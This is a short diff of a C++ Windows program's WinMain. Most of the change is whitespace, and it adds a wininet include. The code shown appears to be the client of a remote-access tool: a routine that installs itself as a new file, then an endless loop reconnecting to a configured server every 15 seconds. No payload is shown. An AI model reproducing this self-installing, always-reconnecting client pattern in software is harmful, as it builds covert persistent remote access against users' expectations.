@@ -15,6 +15,7 @@
 */
 
 #include "general.h"
+#include <wininet.h>
 
 
 #if _DEBUG
@@ -30,35 +31,36 @@ void testMB(std::string s)		//TEST FUNCTION
 
 #endif
 
+
+
+
+
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
-	//VARIABLE SETUP
-	General::lpArguments = lpCmdLine;
+    //VARIABLE SETUP
+    General::lpArguments = lpCmdLine;
 
 
-	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
-		return 0;
+    if (General::init())	//runs init() and exits file if it installs itself (starts new file)
+        return 0;
 
 
-	Client MyClient(Settings::serverIP, Settings::serverPort); //Client
+    Client MyClient(Settings::serverIP, Settings::serverPort); //Client
 
-	while (true)
-	{
-
-
-
-
-		if (!MyClient.connected)
-		{
-			while (!MyClient.Connect())
-			{
-				Sleep(15000);
-			}
-		}
-		Sleep(15000);
-	}
+    while (true)
+    {
 
 
 
+
+        if (!MyClient.connected)
+        {
+            while (!MyClient.Connect())
+            {
+                Sleep(15000);
+            }
+        }
+        Sleep(15000);
+    }
 	return 0;
 }
